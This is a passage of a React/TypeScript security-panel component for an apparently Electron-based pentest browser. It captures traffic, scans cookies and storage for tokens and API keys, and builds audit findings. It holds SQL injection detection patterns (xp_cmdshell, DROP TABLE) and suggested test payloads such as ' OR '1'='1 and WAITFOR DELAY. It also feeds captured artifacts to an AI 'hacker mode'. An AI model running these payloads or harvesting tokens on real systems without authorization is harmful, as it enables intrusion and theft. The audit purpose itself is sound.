import { useEffect, useMemo, useRef, useState } from 'react'
import {
  Activity,
  ArrowLeft,
  ArrowRight,
  Brain,
  Bug,
  Clipboard,
  Cookie,
  Copy,
  Crosshair,
  Database,
  Download,
  FileKey,
  Globe,
  Key,
  Play,
  RefreshCw,
  RotateCcw,
  Send,
  Server,
  Shield,
  Square,
  Trash2,
  Search,
  Edit3,
  Pause,
  Zap,
  Skull,
  Eye,
  Terminal,
  ExternalLink,
  Globe as GlobeIcon,
} from 'lucide-react'
import { useSecurityStore, type CapturedRequest, type SecurityCookie } from '../../store/securityStore'
import { getApi } from '../../utils/platform'
import { useAIStore } from '../../store/aiStore'
import { useSkillStore, HACKER_REPORT_HEADER } from '../../store/skillStore'
import InterceptorPanel from './InterceptorPanel'
import HackerChat from './HackerChat'
import SQLiAdvancedPanel from './SQLiAdvancedPanel'
import AuditReportPanel from './AuditReportPanel'
import { runAudit, type AuditReport } from './SecurityAuditEngine'
import { PenTestEngine, type PenTestResult, type VulnFinding } from './PenTestEngine'

declare global {
  namespace JSX {
    interface IntrinsicElements {
      webview: any
    }
  }
}

type SecurityTab = 'browser' | 'history' | 'sitemap' | 'storage' | 'report' | 'sqli-resources' | 'auditor' | 'intercept' | 'pentest' | 'memory'

type WebsiteMemoryDump = {
  url: string
  title: string
  capturedAt: string
  dom: { tagCount: number; textNodes: number; forms: number; links: number; scripts: number; images: number }
  forms: Array<{ action: string; method: string; inputs: Array<{ name: string; type: string; value: string; placeholder: string }> }>
  globals: Array<{ key: string; type: string; preview: string }>
  localStorage: Record<string, string>
  sessionStorage: Record<string, string>
  meta: Array<{ name: string; content: string }>
  scriptSrcs: string[]
  encodedStrings: Array<{ value: string; encoding: string; decoded?: string }>
  hiddenFields: Array<{ name: string; value: string }>
  links: string[]
}

type SensitiveArtifact = {
  id: string
  type: 'cookie' | 'storage' | 'header' | 'body'
  name: string
  value: string
  location: string
  source: string
  risk: 'alto' | 'medio' | 'baixo'
  reasons: string[]
  jwt?: {
    header: unknown
    payload: unknown
    expiresAt?: string
  }
}

type FindingSeverity = 'alto' | 'medio' | 'baixo'

type SecurityFinding = {
  id: string
  severity: FindingSeverity
  category: 'headers' | 'cookies' | 'errors' | 'sql' | 'storage'
  title: string
  description: string
  evidence: string[]
  remediation: string[]
  validation: string[]
}

function normalizeUrl(value: string) {
  const trimmed = value.trim()
  if (!trimmed) return 'about:blank'
  if (/^(https?|file):\/\//i.test(trimmed) || trimmed === 'about:blank') return trimmed
  return `https://${trimmed}`
}

function extractDomain(url: string): string {
  try {
    const u = new URL(url)
    return u.hostname.replace(/^www\./, '')
  } catch {
    return ''
  }
}

function formatHeaders(headers?: Record<string, string>) {
  return Object.entries(headers || {}).map(([key, value]) => `${key}: ${value}`).join('\n')
}

function parseHeaders(raw: string) {
  return raw.split('\n').reduce<Record<string, string>>((acc, line) => {
    const index = line.indexOf(':')
    if (index > 0) {
      acc[line.slice(0, index).trim()] = line.slice(index + 1).trim()
    }
    return acc
  }, {})
}

function maskSecret(value: string) {
  if (!value) return ''
  if (value.length <= 12) return `${value.slice(0, 2)}...${value.slice(-2)}`
  return `${value.slice(0, 6)}...${value.slice(-6)}`
}

function decodeBase64Url(input: string) {
  const normalized = input.replace(/-/g, '+').replace(/_/g, '/')
  const padded = normalized.padEnd(normalized.length + ((4 - normalized.length % 4) % 4), '=')
  return atob(padded)
}

function tryDecodeJwt(value: string): SensitiveArtifact['jwt'] | undefined {
  const token = value.trim()
  if (!/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(token)) return undefined

  try {
    const header = JSON.parse(decodeBase64Url(token.split('.')[0]))
    const payload = JSON.parse(decodeBase64Url(token.split('.')[1]))
    return {
      header,
      payload,
      expiresAt: typeof payload.exp === 'number' ? new Date(payload.exp * 1000).toLocaleString() : undefined,
    }
  } catch {
    return undefined
  }
}

function addArtifact(
  artifacts: SensitiveArtifact[],
  artifact: Omit<SensitiveArtifact, 'id' | 'jwt'>,
) {
  const jwt = tryDecodeJwt(artifact.value)
  const id = `${artifact.type}:${artifact.location}:${artifact.name}:${artifact.value.slice(0, 16)}`
  if (artifacts.some(item => item.id === id)) return
  artifacts.push({ id, jwt, ...artifact })
}

function scanTextForSecrets(artifacts: SensitiveArtifact[], text: string | undefined, source: string, location: string, type: SensitiveArtifact['type']) {
  if (!text) return

  const patterns = [
    { name: 'JWT', regex: /\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b/g, risk: 'alto' as const },
    { name: 'Bearer Token', regex: /\bBearer\s+([A-Za-z0-9._~+/=-]{20,})/gi, risk: 'alto' as const },
    { name: 'Access Token', regex: /\b(access_token|refresh_token|id_token|session_token)\b["'\s:=]+["']?([A-Za-z0-9._~+/=-]{16,})/gi, risk: 'alto' as const },
    { name: 'API Key', regex: /\b(api[_-]?key|secret|client_secret)\b["'\s:=]+["']?([A-Za-z0-9._~+/=-]{16,})/gi, risk: 'medio' as const },
  ]

  patterns.forEach(pattern => {
    Array.from(text.matchAll(pattern.regex)).forEach((match, index) => {
      const value = match[2] || match[1] || match[0]
      addArtifact(artifacts, {
        type,
        name: `${pattern.name}${index ? ` #${index + 1}` : ''}`,
        value,
        location,
        source,
        risk: pattern.risk,
        reasons: ['Valor sensível detectado em conteúdo trafegado ou armazenado.'],
      })
    })
  })
}

function isStaticRequest(req: CapturedRequest) {
  const url = req.url.toLowerCase()
  const contentType = req.responseHeaders?.['content-type']?.toLowerCase() || ''
  return Boolean(
    url.match(/\.(png|jpg|jpeg|gif|svg|ico|css|js|map|woff|woff2|ttf|eot)(\?.*)?$/) ||
    contentType.includes('image/') ||
    contentType.includes('font/') ||
    contentType.includes('text/css') ||
    contentType.includes('javascript')
  )
}

function buildSecurityFindings(requests: CapturedRequest[], cookies: SecurityCookie[]): SecurityFinding[] {
  const findings: SecurityFinding[] = []

  const sqlErrorPatterns = [
    /sqlstate\[[0-9a-z]+\]/i,
    /syntax error/i,
    /unterminated/i,
    /\bpostgres(?:ql)?\b/i,
    /\bmysql\b/i,
    /\bsqlite\b/i,
    /\boracle\b/i,
    /\bora-\d{4,}\b/i,
    /\bodbc\b/i,
    /\bjdbc\b/i,
    /\bsequelize\b/i,
    /\bprisma\b/i,
  ]

  // Padrões comuns de SQL injection
  const sqlInjectionPatterns = [
    /'(\s+)?OR(\s+)?'(\d+)?'(\s+)?=(\s+)?'(\d+)?/i, // ' OR '1'='1
    /'(\s+)?OR(\s+)1(\s+)?=(\s+)?1/i, // ' OR 1=1
    /'(\s+)?AND(\s+)?'(\d+)?'(\s+)?=(\s+)?'(\d+)?/i, // ' AND '1'='1
    /'(\s+)?AND(\s+)1(\s+)?=(\s+)?1/i, // ' AND 1=1
    /'(\s+)?UNION(\s+)?SELECT/i, // ' UNION SELECT
    /;(\s+)?DROP(\s+)?TABLE/i, // ; DROP TABLE
    /;(\s+)?DELETE(\s+)?FROM/i, // ; DELETE FROM
    /;(\s+)?INSERT(\s+)?INTO/i, // ; INSERT INTO
    /;(\s+)?UPDATE/i, // ; UPDATE
    /--(\s+)?$/i, // Comentário SQL --
    /\/\*.*\*\//i, // Comentário /* */
    /\bexec(\s+)?\(/i, // exec(
    /\bxp_cmdshell/i, // xp_cmdshell
    /\bwaitfor(\s+)?delay/i, // WAITFOR DELAY
    /'(\s+)?;(\s+)?/i, // ' ; 
    /\bor(\s+)?1=1/i, // OR 1=1
    /\band(\s+)?1=1/i, // AND 1=1
    /\badmin'(\s+)?--/i, // admin' --
    /'(\s+)?or(\s+)?true/i, // ' OR true
    /'(\s+)?or(\s+)?false/i, // ' OR false
    /\b1'(\s+)?or(\s+)?'1'='1/i, // 1' OR '1'='1
  ]

  const htmlResponses = requests.filter(req => {
    const contentType = req.responseHeaders?.['content-type']?.toLowerCase() || ''
    return contentType.includes('text/html')
  })

  // Verificar requisições por padrões de SQL injection
  requests.forEach((req, idx) => {
    const requestData = [req.url, req.body, JSON.stringify(req.headers)].join(' ').toLowerCase()
    const hasInjectionPattern = sqlInjectionPatterns.some(pattern => pattern.test(requestData))
    
    if (hasInjectionPattern) {
      findings.push({
        id: `sqli-req-${idx}`,
        severity: 'alto',
        category: 'sql',
        title: 'Possível tentativa de SQL Injection detectada',
        description: 'Padrões característicos de SQL injection foram encontrados na requisição. Isso pode permitir que atacantes executem comandos SQL arbitrários no banco de dados.',
        evidence: [`${req.method} ${req.url}`],
        remediation: [
          '🔒 Utilizar queries parametrizadas (prepared statements) - NÃO concatenar strings em SQL',
          '🔒 Evitar queries dinâmicas sempre que possível',
          '🔒 Validar e sanitizar todas as entradas do usuário (whitelist > blacklist)',
          '🔒 Implementar least privilege nas contas de banco de dados (não usar root/sa)',
          '🔒 Considerar uso de ORM seguro (Sequelize, Prisma, Hibernate, etc.)',
          '🔒 Escapar caracteres especiais se queries dinâmicas forem necessárias',
          '🔒 Implementar WAF (Web Application Firewall) para bloqueio de padrões',
          '🔒 Logar e monitorar tentativas de SQL injection',
        ],
        validation: [
          '🧪 Testar a entrada com payloads de SQL injection conhecidos (ex: \' OR \'1\'=\'1)',
          '🧪 Verificar se a aplicação responde com erros de SQL detalhados',
          '🧪 Confirmar que prepared statements estão sendo usados',
          '🧪 Tentar UNION SELECT para ver se extrai dados',
          '🧪 Testar boolean-based blind (ex: AND 1=1, AND 1=2)',
          '🧪 Testar time-based blind (ex: WAITFOR DELAY \'0:0:10\')',
        ],
      })
    }
  })

  htmlResponses.forEach((req, idx) => {
    const headers = Object.keys(req.responseHeaders || {}).map(key => key.toLowerCase())

    if (!headers.includes('content-security-policy')) {
      findings.push({
        id: `hdr-csp-${idx}`,
        severity: 'medio',
        category: 'headers',
        title: 'Ausência de Content-Security-Policy (CSP)',
        description: 'Sem CSP, o impacto de XSS costuma ser maior e mais difícil de mitigar em produção.',
        evidence: [`${req.method} ${req.url}`],
        remediation: [
          'Definir Content-Security-Policy alinhada ao front-end (scripts, styles, imgs, connects).',
          'Aplicar em modo de relatório antes de bloquear (Report-Only), se necessário.',
        ],
        validation: [
          'Recarregar a página e confirmar a presença de Content-Security-Policy no response header.',
          'Verificar no DevTools se violações aparecem no console e ajustar diretivas gradualmente.',
        ],
      })
    }

    if (!headers.includes('x-frame-options') && !headers.includes('frame-ancestors') && !headers.includes('content-security-policy')) {
      findings.push({
        id: `hdr-frame-${idx}`,
        severity: 'baixo',
        category: 'headers',
        title: 'Proteção contra clickjacking ausente/indefinida',
        description: 'Páginas sem proteção podem ser embutidas em iframes de terceiros, aumentando risco de clickjacking.',
        evidence: [`${req.method} ${req.url}`],
        remediation: [
          'Adicionar X-Frame-Options (DENY/SAMEORIGIN) ou usar frame-ancestors via CSP.',
        ],
        validation: [
          'Confirmar a presença de X-Frame-Options ou frame-ancestors em responses HTML.',
        ],
      })
    }

    if (!headers.includes('x-content-type-options')) {
      findings.push({
        id: `hdr-cto-${idx}`,
        severity: 'baixo',
        category: 'headers',
        title: 'Ausência de X-Content-Type-Options: nosniff',
        description: 'Sem nosniff, alguns navegadores podem tentar “adivinhar” o tipo de conteúdo em respostas, abrindo margem para comportamentos inesperados.',
        evidence: [`${req.method} ${req.url}`],
        remediation: ['Adicionar X-Content-Type-Options: nosniff em respostas.'],
        validation: ['Recarregar a página e conferir o header X-Content-Type-Options.'],
      })
    }

    if (req.url.startsWith('https://') && !headers.includes('strict-transport-security')) {
      findings.push({
        id: `hdr-hsts-${idx}`,
        severity: 'medio',
        category: 'headers',
        title: 'Ausência de Strict-Transport-Security (HSTS)',
        description: 'Sem HSTS, o navegador pode aceitar downgrade para HTTP em cenários de ataque ou configuração incorreta.',
        evidence: [`${req.method} ${req.url}`],
        remediation: [
          'Adicionar Strict-Transport-Security com max-age adequado.',
          'Considerar includeSubDomains e preload conforme estratégia de domínio.',
        ],
        validation: [
          'Confirmar o header Strict-Transport-Security em responses HTTPS.',
          'Verificar se o site funciona corretamente em HTTPS antes de aumentar o max-age.',
        ],
      })
    }
  })

  requests
    .filter(req => req.status && req.status >= 500)
    .forEach((req, idx) => {
      const body = (req.responseBody || '').slice(0, 4000)
      const looksSql = sqlErrorPatterns.some(re => re.test(body))

      if (looksSql) {
        findings.push({
          id: `err-sql-${idx}`,
          severity: 'alto',
          category: 'sql',
          title: 'Possível vazamento de erro SQL/driver no response',
          description: 'Respostas com erro interno contendo mensagens de banco podem revelar detalhes de schema, driver, query ou stack trace.',
          evidence: [`${req.method} ${req.url} -> HTTP ${req.status}`],
          remediation: [
            'Padronizar tratamento de erros: respostas genéricas para o cliente e logs detalhados apenas no servidor.',
            'Revisar consultas e validações de entrada no endpoint que falhou.',
            'Garantir uso de queries parametrizadas e evitar concatenar strings em SQL.',
          ],
          validation: [
            'Repetir a mesma requisição e confirmar que o response não expõe mensagens de banco/stack trace.',
            'Conferir se logs internos capturam o erro com correlação de request-id.',
          ],
        })
      } else {
        findings.push({
          id: `err-5xx-${idx}`,
          severity: 'medio',
          category: 'errors',
          title: 'Erro interno (5xx) observado',
          description: 'Erros 5xx recorrentes podem indicar falhas de validação, dependências instáveis ou tratamento inadequado de exceções.',
          evidence: [`${req.method} ${req.url} -> HTTP ${req.status}`],
          remediation: [
            'Adicionar observabilidade (logs estruturados, tracing) e tratar exceções com respostas padronizadas.',
            'Revisar limites, validações e timeouts do endpoint.',
          ],
          validation: [
            'Reexecutar a requisição e confirmar se o erro é reproduzível.',
            'Verificar logs de backend para causa raiz e corrigir antes de revalidar.',
          ],
        })
      }
    })

  cookies.forEach((cookie, idx) => {
    if (!cookie.httpOnly) {
      findings.push({
        id: `ck-httponly-${idx}`,
        severity: 'medio',
        category: 'cookies',
        title: 'Cookie sem HttpOnly',
        description: 'Cookies acessíveis por JavaScript aumentam o impacto de XSS, pois podem ser lidos no navegador.',
        evidence: [`${cookie.name} @ ${cookie.domain}${cookie.path}`],
        remediation: [
          'Marcar cookie de sessão com HttpOnly sempre que possível.',
          'Evitar armazenar tokens sensíveis em localStorage/sessionStorage.',
        ],
        validation: [
          'Confirmar que o Set-Cookie inclui HttpOnly para cookies de autenticação/sessão.',
        ],
      })
    }

    if (!cookie.secure) {
      findings.push({
        id: `ck-secure-${idx}`,
        severity: 'medio',
        category: 'cookies',
        title: 'Cookie sem Secure',
        description: 'Sem Secure, o cookie pode ser enviado em conexões não-TLS se houver downgrade ou endpoint HTTP.',
        evidence: [`${cookie.name} @ ${cookie.domain}${cookie.path}`],
        remediation: ['Marcar cookie como Secure e forçar HTTPS no domínio.'],
        validation: ['Confirmar Secure em Set-Cookie e validar que a aplicação opera em HTTPS.'],
      })
    }

    if (!cookie.sameSite || cookie.sameSite === 'unspecified') {
      findings.push({
        id: `ck-samesite-${idx}`,
        severity: 'baixo',
        category: 'cookies',
        title: 'Cookie sem SameSite definido',
        description: 'Sem SameSite, aumenta o risco de uso indevido em navegação cross-site e dificulta mitigação de CSRF.',
        evidence: [`${cookie.name} @ ${cookie.domain}${cookie.path}`],
        remediation: ['Definir SameSite (Lax/Strict/None) conforme fluxo e exigências de cross-site.'],
        validation: ['Confirmar SameSite no Set-Cookie e testar fluxos de login/callback se aplicável.'],
      })
    }
  })

  if (!findings.length) {
    findings.push({
      id: 'none',
      severity: 'baixo',
      category: 'errors',
      title: 'Nenhum apontamento automático encontrado',
      description: 'Os checks automáticos são limitados ao tráfego/cookies observados. Fluxos autenticados e endpoints sensíveis exigem revisão manual.',
      evidence: [],
      remediation: [
        'Revisar endpoints críticos (auth, pagamentos, admin) e aplicar OWASP ASVS como checklist.',
        'Garantir logs e monitoramento adequados em produção.',
      ],
      validation: ['Capturar tráfego de fluxos autenticados e reexecutar a análise.'],
    })
  }

  const severityRank = { alto: 0, medio: 1, baixo: 2 }
  return findings.sort((a, b) => severityRank[a.severity] - severityRank[b.severity])
}

function escapeHtml(value: string) {
  return value
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;')
}


export default function SecurityPanel() {
  const {
    isProxyRunning,
    isMonitoring,
    isMitmRunning,
    browserPartition,
    proxyPort,
    mitmPort,
    mitmCaPath,
    startProxy,
    stopProxy,
    startMonitoring,
    stopMonitoring,
    capturedRequests,
    browserEvents,
    clearRequests,
    selectedRequestId,
    setSelectedRequest,
    addCapturedRequest,
    updateCapturedRequest,
    addBrowserEvent,
    getCookies,
    clearBrowserData,
    replayRequest,
    startMitm,
    stopMitm,
    openCaCert,
    isAutoAnalyzeEnabled,
    toggleAutoAnalyze,
  } = useSecurityStore()
  const { addMessage, togglePanel } = useAIStore()

  const webviewRef = useRef<any>(null)
  const [webviewElement, setWebviewElement] = useState<any>(null)
  const [activeTab, setActiveTab] = useState<SecurityTab>('browser')
  const [targetUrl, setTargetUrl] = useState('https://example.com')
  const [currentUrl, setCurrentUrl] = useState('about:blank')
  const [portInput, setPortInput] = useState(proxyPort.toString())
  const [mitmPortInput, setMitmPortInput] = useState(mitmPort.toString())
  const [cookies, setCookies] = useState<SecurityCookie[]>([])
  const [storageSnapshot, setStorageSnapshot] = useState<{ localStorage: Record<string, string>; sessionStorage: Record<string, string> }>({ localStorage: {}, sessionStorage: {} })
  const [autoAnalyzeBatch, setAutoAnalyzeBatch] = useState<CapturedRequest[]>([])
  const [replayHeaders, setReplayHeaders] = useState('')
  const [replayBody, setReplayBody] = useState('')
  const [replayMethod, setReplayMethod] = useState('GET')
  const [replayUrl, setReplayUrl] = useState('')
  const [reportCopied, setReportCopied] = useState(false)
  const [revealedSecrets, setRevealedSecrets] = useState<Record<string, boolean>>({})
  const [auditReport, setAuditReport] = useState<AuditReport | null>(null)
  const [isAuditRunning, setIsAuditRunning] = useState(false)
  const auditStartTime = useRef(0)
  const previousDomainRef = useRef<string>('')
  const [pentestRunning, setPentestRunning] = useState(false)
  const [pentestProgress, setPentestProgress] = useState('')
  const [pentestProgressValue, setPentestProgressValue] = useState(0)
  const [pentestResults, setPentestResults] = useState<PenTestResult | null>(null)
  const [pentestTestingFor, setPentestTestingFor] = useState<'all' | 'sqli' | 'auth-bypass' | 'database-access'>('all')
  const [pentestFindings, setPentestFindings] = useState<VulnFinding[]>([])
  const [pentestSubTab, setPentestSubTab] = useState<'standard' | 'sqli-advanced'>('standard')
  const pentestEngineRef = useRef<PenTestEngine | null>(null)

  // Hacker Mode & Internal Browser
  const { hackerMode, setHackerMode } = useSkillStore()
  const [hackerBrowserUrl, setHackerBrowserUrl] = useState('')
  const hackerBrowserRef = useRef<HTMLIFrameElement>(null)

  // Website Memory Dump
  const [websiteMemoryDump, setWebsiteMemoryDump] = useState<WebsiteMemoryDump | null>(null)
  const [memoryCapturing, setMemoryCapturing] = useState(false)

  const cancelPentest = () => {
    pentestEngineRef.current?.cancel()
    setPentestProgress('⛔ Cancelando...')
  }

  // Limpa todos os dados do site anterior (requests, eventos, auditoria, cookies, storage)
  const clearSiteData = () => {
    clearRequests()                // limpa capturedRequests, browserEvents, selectedRequestId do store
    setCookies([])                 // limpa cookies locais
    setStorageSnapshot({ localStorage: {}, sessionStorage: {} })  // limpa storage local
    setAutoAnalyzeBatch([])        // limpa batch de análise automática
    setAuditReport(null)           // limpa relatório de auditoria
    setIsAuditRunning(false)
  }

  // Ouvir comandos de navegação do navegador hacker (via IA)
  const hackerBrowserCommandUrl = useSkillStore(s => s.hackerBrowserCommandUrl)

  useEffect(() => {
    if (hackerBrowserCommandUrl) {
      const url = hackerBrowserCommandUrl.startsWith('http') ? hackerBrowserCommandUrl : `https://${hackerBrowserCommandUrl}`
      setHackerBrowserUrl(url)
      setCurrentUrl(url)
      useSkillStore.getState().setHackerBrowserCommandUrl(null)
    }
  }, [hackerBrowserCommandUrl])

  const startAudit = () => {
    setIsAuditRunning(true)
    setAuditReport(null)
    auditStartTime.current = Date.now()
    
    // Small delay to let UI render, then run audit
    setTimeout(() => {
      const report = runAudit(capturedRequests, cookies, currentUrl, auditStartTime.current)
      setAuditReport(report)
      setIsAuditRunning(false)
    }, 500)
  }

  const selectedRequest = useMemo(
    () => capturedRequests.find(req => req.id === selectedRequestId) || null,
    [capturedRequests, selectedRequestId]
  )

  const dynamicRequests = useMemo(
    () => capturedRequests.filter(req => !isStaticRequest(req)),
    [capturedRequests]
  )

  const sitemapData = useMemo(() => {
    const map: Record<string, Set<string>> = {}
    capturedRequests.forEach(req => {
      try {
        const urlObj = new URL(req.url)
        const path = `${urlObj.pathname}${urlObj.search}`
        if (!map[urlObj.host]) map[urlObj.host] = new Set()
        map[urlObj.host].add(path || '/')
      } catch {
        // Ignore internal URLs.
      }
    })

    return Object.keys(map).sort().reduce<Record<string, string[]>>((acc, host) => {
      acc[host] = Array.from(map[host]).sort()
      return acc
    }, {})
  }, [capturedRequests])

  const sensitiveArtifacts = useMemo(() => {
    const artifacts: SensitiveArtifact[] = []

    cookies.forEach(cookie => {
      const lowerName = cookie.name.toLowerCase()
      const looksSensitive = /(token|jwt|session|auth|refresh|access|secret|key)/.test(lowerName) || tryDecodeJwt(cookie.value)
      if (!looksSensitive) return

      const reasons: string[] = []
      if (!cookie.httpOnly) reasons.push('Cookie acessível por JavaScript: falta HttpOnly.')
      if (!cookie.secure) reasons.push('Cookie pode trafegar sem TLS: falta Secure.')
      if (!cookie.sameSite || cookie.sameSite === 'unspecified') reasons.push('Cookie sem SameSite definido.')
      if (tryDecodeJwt(cookie.value)) reasons.push('Valor parece ser JWT e pode carregar claims sensíveis.')

      addArtifact(artifacts, {
        type: 'cookie',
        name: cookie.name,
        value: cookie.value,
        location: `${cookie.domain}${cookie.path}`,
        source: 'Cookie jar da sessão isolada',
        risk: !cookie.httpOnly || !cookie.secure ? 'alto' : 'medio',
        reasons: reasons.length ? reasons : ['Cookie tem nome/valor com aparência sensível.'],
      })
    })

    Object.entries(storageSnapshot.localStorage).forEach(([key, value]) => {
      const source = 'localStorage'
      const reasons = [
        'Token/chave em localStorage fica acessível por JavaScript e aumenta impacto de XSS.',
        'Persistência sobrevive ao fechamento da aba.',
      ]
      if (/(token|jwt|session|auth|refresh|access|secret|key)/i.test(key) || tryDecodeJwt(value)) {
        addArtifact(artifacts, { type: 'storage', name: key, value, location: source, source, risk: 'alto', reasons })
      }
      scanTextForSecrets(artifacts, value, source, key, 'storage')
    })

    Object.entries(storageSnapshot.sessionStorage).forEach(([key, value]) => {
      const source = 'sessionStorage'
      const reasons = ['Token/chave em sessionStorage fica acessível por JavaScript durante a sessão.']
      if (/(token|jwt|session|auth|refresh|access|secret|key)/i.test(key) || tryDecodeJwt(value)) {
        addArtifact(artifacts, { type: 'storage', name: key, value, location: source, source, risk: 'medio', reasons })
      }
      scanTextForSecrets(artifacts, value, source, key, 'storage')
    })

    capturedRequests.forEach(req => {
      Object.entries(req.headers || {}).forEach(([key, value]) => {
        if (/(authorization|token|api-key|x-api-key|cookie)/i.test(key)) {
          addArtifact(artifacts, {
            type: 'header',
            name: key,
            value,
            location: `${req.method} ${req.url}`,
            source: 'Request header',
            risk: /authorization|cookie/i.test(key) ? 'alto' : 'medio',
            reasons: ['Credencial ou identificador sensível trafegando em header.'],
          })
        }
        scanTextForSecrets(artifacts, value, 'Request header', `${req.method} ${req.url}`, 'header')
      })

      Object.entries(req.responseHeaders || {}).forEach(([key, value]) => {
        if (/(set-cookie|authorization|token|api-key|x-api-key)/i.test(key)) {
          addArtifact(artifacts, {
            type: 'header',
            name: key,
            value,
            location: `${req.method} ${req.url}`,
            source: 'Response header',
            risk: /set-cookie|authorization/i.test(key) ? 'alto' : 'medio',
            reasons: ['Credencial ou sessão sensível retornada pelo servidor.'],
          })
        }
        scanTextForSecrets(artifacts, value, 'Response header', `${req.method} ${req.url}`, 'header')
      })

      scanTextForSecrets(artifacts, req.body, 'Request body', `${req.method} ${req.url}`, 'body')
      scanTextForSecrets(artifacts, req.responseBody, 'Response body', `${req.method} ${req.url}`, 'body')
    })

    return artifacts.sort((a, b) => {
      const rank = { alto: 0, medio: 1, baixo: 2 }
      return rank[a.risk] - rank[b.risk]
    })
  }, [capturedRequests, cookies, storageSnapshot])

  // 🔴 Atualiza o contexto ao vivo para a IA (modo hacker)
  // Deve ficar DEPOIS da declaração do sensitiveArtifacts para evitar ReferenceError
  useEffect(() => {
    if (!hackerMode) {
      useSkillStore.getState().setHackerLiveContext(null)
      return
    }

    const liveRequests = capturedRequests.slice(-10).map(r => ({
      method: r.method || 'GET',
      url: (r as any).url || '',
      status: (r as any).statusCode || (r as any).status || 0,
      type: (r as any).resourceType || (r as any).type || '',
    }))

    const cookieList = cookies.map(c => ({
      name: c.name,
      domain: c.domain,
      httpOnly: false,
      secure: false,
      sameSite: '',
    }))

    const artifactList = sensitiveArtifacts.slice(0, 20).map(a => ({
      name: a.name,
      type: a.source || 'unknown',
      risk: a.risk || 'medium',
      source: a.source || 'captured',
    }))

    useSkillStore.getState().setHackerLiveContext({
      currentUrl: currentUrl || '',
      browserTitle: document.title,
      capturedRequestsCount: capturedRequests.length,
      lastRequests: liveRequests,
      cookies: cookieList,
      sensitiveArtifacts: artifactList,
      pentestFindingsCount: pentestFindings.length,
      pentestFindings: pentestFindings.slice(0, 20).map(f => ({
        type: f.type,
        severity: f.severity,
        title: f.title,
        endpoint: f.endpoint,
      })),
      proxyActive: useSecurityStore.getState().isProxyRunning,
      monitorActive: useSecurityStore.getState().isMonitoring,
    })
  }, [hackerMode, currentUrl, cookies, sensitiveArtifacts, pentestFindings, capturedRequests.length])

  const securityFindings = useMemo(
    () => buildSecurityFindings(dynamicRequests, cookies),
    [dynamicRequests, cookies]
  )

  const report = useMemo(() => {
    const findingsMarkdown = securityFindings.map((finding) => {
      const header = `### [${finding.severity.toUpperCase()}] ${finding.title}`
      const description = finding.description ? `\n${finding.description}` : ''
      const evidence = finding.evidence.length ? `\n\n**Evidências**\n${finding.evidence.map(item => `- ${item}`).join('\n')}` : ''
      const remediation = finding.remediation.length ? `\n\n**Soluções sugeridas**\n${finding.remediation.map(item => `- ${item}`).join('\n')}` : ''
      const validation = finding.validation.length ? `\n\n**Como validar**\n${finding.validation.map(item => `- ${item}`).join('\n')}` : ''
      return `${header}${description}${evidence}${remediation}${validation}`
    }).join('\n\n')

    return `# Relatório de Segurança

Data: ${new Date().toLocaleString()}
Escopo observado: navegador controlado Ezek

## Resumo
- Requisições capturadas: ${capturedRequests.length}
- Requisições dinâmicas analisadas: ${dynamicRequests.length}
- Cookies observados: ${cookies.length}
- Segredos/tokens suspeitos: ${sensitiveArtifacts.length}
- Eventos de sessão: ${browserEvents.length}

## Apontamentos
${findingsMarkdown}

## Tokens, Chaves e Sessões Expostos
${sensitiveArtifacts.map(item => `- [${item.risk.toUpperCase()}] ${item.name} em ${item.source} (${item.location}) valor: ${maskSecret(item.value)}. ${item.reasons.join(' ')}`).join('\n') || '- Nenhum token/chave sensível detectado automaticamente.'}

## Endpoints Mapeados
${Object.entries(sitemapData).map(([host, paths]) => `### ${host}\n${paths.map(path => `- ${path}`).join('\n')}`).join('\n\n') || '- Nenhum endpoint mapeado.'}

## Evidências Recentes
${dynamicRequests.slice(0, 20).map(req => `- ${req.method} ${req.url} -> ${req.status || req.error || 'pendente'} (${req.durationMs || 0}ms)`).join('\n') || '- Nenhuma evidência dinâmica capturada.'}
`
  }, [browserEvents.length, capturedRequests.length, cookies.length, dynamicRequests.length, sensitiveArtifacts, sitemapData, securityFindings])

  useEffect(() => {
    startMonitoring()
  }, [startMonitoring])

  useEffect(() => {
    if (!webviewElement) return

    const handleNavigate = (event: any) => {
      const newDomain = extractDomain(event.url)
      const oldDomain = previousDomainRef.current
      
      // Se mudou de domínio, limpa todos os dados do site anterior
      if (newDomain && newDomain !== oldDomain && oldDomain) {
        clearSiteData()
      }
      
      previousDomainRef.current = newDomain || ''
      setCurrentUrl(event.url)
      setTargetUrl(event.url)
      refreshSessionData()
    }
    const handleReady = () => refreshSessionData()
    const handleFailLoad = (event: any) => {
      console.warn('[SecurityPanel] Webview falhou ao carregar:', event.errorCode, event.errorDescription, event.validatedURL)
      // Erros comuns de certificado: -3 (ERR_ABORTED), -2 (ERR_FAILED), -200 (ERR_CERT_AUTHORITY_INVALID)
      // Erro -3 também ocorre em timeout
      const isCertError = event.errorCode === -200 || event.errorCode === -201 || event.errorCode === -202 || event.errorCode === -203
      if (isCertError) {
        console.log('[SecurityPanel] Erro de certificado - tentando recarregar...')
        setTimeout(() => {
          webviewElement?.reload()
        }, 1000)
      }
    }
    const handleConsoleMessage = (event: any) => {
      // Loga mensagens do console do webview para debug
      if (event.level === 2) console.warn('[Webview]', event.message)
      else if (event.level === 3) console.error('[Webview]', event.message)
    }

    webviewElement.addEventListener('did-navigate', handleNavigate)
    webviewElement.addEventListener('did-navigate-in-page', handleNavigate)
    webviewElement.addEventListener('dom-ready', handleReady)
    webviewElement.addEventListener('did-finish-load', handleReady)
    webviewElement.addEventListener('did-fail-load', handleFailLoad)
    webviewElement.addEventListener('console-message', handleConsoleMessage)

    return () => {
      webviewElement.removeEventListener('did-navigate', handleNavigate)
      webviewElement.removeEventListener('did-navigate-in-page', handleNavigate)
      webviewElement.removeEventListener('dom-ready', handleReady)
      webviewElement.removeEventListener('did-finish-load', handleReady)
      webviewElement.removeEventListener('did-fail-load', handleFailLoad)
      webviewElement.removeEventListener('console-message', handleConsoleMessage)
    }
  }, [webviewElement])

  useEffect(() => {
    const api = getApi()
    if (!api) return

    const unsubReq = api.onSecurityRequestCaptured(addCapturedRequest)
    const unsubRes = api.onSecurityResponseCaptured((res) => {
      updateCapturedRequest(res.id, res)
      const state = useSecurityStore.getState()
      if (!state.isAutoAnalyzeEnabled) return

      const req = state.capturedRequests.find(item => item.id === res.id)
